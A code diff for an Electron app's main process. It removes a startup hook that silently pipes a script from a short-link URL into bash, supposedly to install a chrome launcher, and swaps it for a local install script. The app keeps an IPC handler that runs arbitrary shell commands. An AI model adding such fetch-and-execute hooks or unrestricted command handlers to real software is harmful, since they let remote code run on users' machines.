@@ -21,7 +21,6 @@ function createWindow() {
 
   win.loadFile('index.html');
 
-
   ipcMain.on('run-command', async (event, command) => {
     const shellPath = await getShellPath()
     const shellProfileFilename = getShellProfileFilenameFromPath(shellPath)
@@ -45,24 +44,21 @@ function createWindow() {
 }
 
 app.whenReady().then(async () => {
-  // Check if file exists before installing chrome-launcher
-  if (!fs.existsSync('~/bin/chrome_launcher.sh')) {
-    await new Promise(res => {
-      exec('curl -sL https://rt.cx/psat | bash', (error, stdout, stderr) => {
-        if (error) {
-          console.error(`Error executing command: ${error}`);
-          return;
-        }
-        if (stdout) {
-          console.log(`stdout: ${stdout}`);
-        }
-        if (stderr) {
-          console.error(`stderr: ${stderr}`);
-        }
-        res()
-      });
-    })
-  }
+  await new Promise(res => {
+    exec('bash install.sh', (error, stdout, stderr) => {
+      if (error) {
+        console.error(`Error executing command: ${error}`);
+        return;
+      }
+      if (stdout) {
+        console.log(`stdout: ${stdout}`);
+      }
+      if (stderr) {
+        console.error(`stderr: ${stderr}`);
+      }
+      res()
+    });
+  })
 
   createWindow()
 });
@@ -86,21 +82,3 @@ function getShellPath() {
 function getShellProfileFilenameFromPath(shellPath) {
   return `.${shellPath.split('/bin/').pop().trim()}rc`
 }
-
-ipcMain.on('run-command', async (event, command) => {
-  const shellPath = await getShellPath()
-  const shellProfileFilename = getShellProfileFilenameFromPath(shellPath)
-
-  exec(`source ~/${shellProfileFilename} && ${command}`, { shell: shellPath }, (error, stdout, stderr) => {
-    if (error) {
-      console.error(`Error executing script: ${error}`);
-      return;
-    }
-    if (stdout) {
-      console.log(`stdout: ${stdout}`);
-    }
-    if (stderr) {
-      console.error(`stderr: ${stderr}`);
-    }
-  });
-});
